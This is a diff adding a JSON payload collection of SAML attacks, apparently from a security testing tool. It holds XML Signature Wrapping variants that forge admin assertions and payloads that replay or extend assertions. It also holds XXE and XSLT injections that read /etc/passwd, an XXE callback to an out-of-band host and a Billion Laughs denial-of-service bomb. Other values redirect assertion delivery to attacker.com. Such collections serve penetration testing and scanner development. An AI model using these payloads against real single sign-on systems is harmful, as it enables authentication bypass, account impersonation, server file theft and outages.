@@ -1,0 +1,40 @@
+{
+  "category": "saml",
+  "contexts": {
+    "signature_wrapping": {
+      "description": "XML Signature Wrapping (XSW) attacks against SAML assertions",
+      "payloads": [
+        {"payload": "<samlp:Response><ds:Signature><ds:SignedInfo><ds:Reference URI=\"#original\"/></ds:SignedInfo></ds:Signature><saml:Assertion ID=\"original\">LEGITIMATE</saml:Assertion><saml:Assertion ID=\"forged\">ATTACKER_AS_ADMIN</saml:Assertion></samlp:Response>", "description": "XSW1: Move signature to envelope, add forged assertion after signed one", "waf_bypass": false},
+        {"payload": "<samlp:Response ID=\"resp\"><ds:Signature/><saml:Assertion ID=\"original\">LEGITIMATE</saml:Assertion></samlp:Response><samlp:Response><saml:Assertion ID=\"forged\">ATTACKER_AS_ADMIN</saml:Assertion></samlp:Response>", "description": "XSW2: Wrap entire response, place forged assertion in outer response", "waf_bypass": false},
+        {"payload": "<samlp:Response><saml:Assertion ID=\"forged\">ATTACKER</saml:Assertion><ds:Signature><ds:Object><saml:Assertion ID=\"original\">LEGITIMATE</saml:Assertion></ds:Object></ds:Signature></samlp:Response>", "description": "XSW3: Clone assertion, hide original inside Signature's Object element", "waf_bypass": false},
+        {"payload": "<samlp:Response><ds:Signature/><saml:Assertion ID=\"original\">LEGITIMATE<saml:Assertion ID=\"forged\">ATTACKER_AS_ADMIN</saml:Assertion></saml:Assertion></samlp:Response>", "description": "XSW4: Inject second assertion nested inside the signed assertion", "waf_bypass": false},
+        {"payload": "<samlp:Response><saml:Assertion ID=\"forged\">ATTACKER<ds:Signature><ds:Object><samlp:Response><saml:Assertion ID=\"original\">LEGITIMATE</saml:Assertion></samlp:Response></ds:Object></ds:Signature></saml:Assertion></samlp:Response>", "description": "XSW5: Deep nesting — forged assertion wraps signature wraps original response", "waf_bypass": false}
+      ]
+    },
+    "assertion_replay": {
+      "description": "Replay or modify SAML assertions to bypass authentication",
+      "payloads": [
+        {"payload": "BASE64_ENCODED_CAPTURED_SAML_RESPONSE", "description": "Replay a previously captured valid SAML response to re-authenticate", "waf_bypass": false},
+        {"payload": "<saml:Conditions NotBefore=\"2020-01-01T00:00:00Z\" NotOnOrAfter=\"2099-12-31T23:59:59Z\">", "description": "Modify NotOnOrAfter to far future to extend assertion validity indefinitely", "waf_bypass": false},
+        {"payload": "<saml:AudienceRestriction><saml:Audience>https://target-sp.com/saml/metadata</saml:Audience></saml:AudienceRestriction>", "description": "Change Audience to target SP to redirect assertion from one SP to another", "waf_bypass": false}
+      ]
+    },
+    "xml_injection": {
+      "description": "XML-based attacks within SAML messages",
+      "payloads": [
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><samlp:AuthnRequest><saml:Issuer>&xxe;</saml:Issuer></samlp:AuthnRequest>", "description": "XXE in SAML AuthnRequest to read server files", "waf_bypass": false},
+        {"payload": "<samlp:AuthnRequest><saml:Issuer><xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:value-of select=\"document('file:///etc/passwd')\"/></xsl:template></xsl:stylesheet></saml:Issuer></samlp:AuthnRequest>", "description": "XSLT injection in SAML request for server-side file read", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><samlp:AuthnRequest>&lol3;</samlp:AuthnRequest>", "description": "Billion Laughs XML bomb to cause DoS on SAML processor", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://COLLABORATOR/saml-xxe\">]><samlp:AuthnRequest><saml:Issuer>&xxe;</saml:Issuer></samlp:AuthnRequest>", "description": "External entity expansion with OOB callback to confirm XXE processing", "waf_bypass": false}
+      ]
+    },
+    "recipient_mismatch": {
+      "description": "Manipulate SAML assertion delivery targets",
+      "payloads": [
+        {"payload": "<saml:SubjectConfirmationData Recipient=\"https://attacker.com/saml/acs\" NotOnOrAfter=\"2099-12-31T23:59:59Z\"/>", "description": "Change Recipient to attacker-controlled ACS endpoint", "waf_bypass": false},
+        {"payload": "<samlp:Response Destination=\"https://attacker.com/saml/acs\">", "description": "Modify Response Destination to redirect assertion delivery", "waf_bypass": false},
+        {"payload": "<samlp:Response InResponseTo=\"_FORGED_REQUEST_ID\">", "description": "Manipulate InResponseTo to link assertion to a different authentication request", "waf_bypass": false}
+      ]
+    }
+  }
+}
